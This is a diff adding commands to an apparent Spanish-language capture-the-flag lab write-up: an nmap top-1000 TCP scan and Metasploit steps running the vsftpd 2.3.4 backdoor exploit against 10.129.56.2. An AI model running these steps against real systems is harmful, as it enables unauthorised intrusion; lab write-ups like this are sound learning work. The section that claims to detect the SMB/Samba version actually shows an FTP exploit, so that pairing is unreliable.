@@ -32,6 +32,9 @@
 🎯 **Objetivo:** Identificar puertos TCP abiertos más comunes.
 
 ✅ **Comando ejecutado:**
+```bash
+nmap -v -T4 -Pn --top-ports 1000 -oA nmap/top1000_tcp 10.129.56.2
+```
 
 
 🔎 **Resultado:**
@@ -80,6 +83,12 @@
 🎯 **Objetivo:** Detectar versión del servicio SMB/Samba en puertos 139 y 445.
 
 ✅ **Comando ejecutado:**
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.129.56.2
+run
+```
 
 
 🔎 **Resultado:**
